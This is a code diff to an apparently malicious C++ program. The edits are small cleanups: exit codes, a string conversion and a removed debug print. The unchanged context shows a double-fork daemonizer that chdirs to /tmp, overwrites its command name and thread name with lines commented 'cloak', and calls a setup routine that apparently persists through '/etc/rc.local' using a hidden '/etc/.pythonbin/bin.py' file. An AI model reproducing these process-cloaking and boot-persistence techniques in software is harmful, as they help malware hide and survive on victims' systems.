@@ -58,19 +58,19 @@ class gui_bar{
             pid_t pid;
             pid = fork();
             if (pid < 0){
-                exit(EXIT_FAILURE);
+                exit(-1);
             } if(pid > 0){
-                exit(EXIT_SUCCESS);
+                exit(0);
             } if (setsid() < 0){
-                exit(EXIT_FAILURE);
+                exit(-1);
             }
             signal(SIGCHLD,SIG_IGN);
             signal(SIGHUP,SIG_IGN);
             pid = fork();
             if (pid < 0){
-                exit(EXIT_FAILURE);
+                exit(-1);
             } if (pid > 0){
-                exit(EXIT_SUCCESS);
+                exit(0);
             }
             umask(0);
             chdir("/tmp/");
@@ -111,7 +111,7 @@ class gui_bar{
             } else{
                 uid_user = " # ";
             }
-            return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + uid_user;
+            return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
         }
         void file_setup(string service_s, string file_p)
         {
@@ -306,7 +306,6 @@ int main(int argc, char *argv[]){
     string gui_t = gu.gui_procc(argv[0]);
     strcpy(argv[0], (gui_t).c_str()); // cloak, command name
     prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
-    cout << gui_t << endl;
     gb.daemon();
     gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
     while(1){
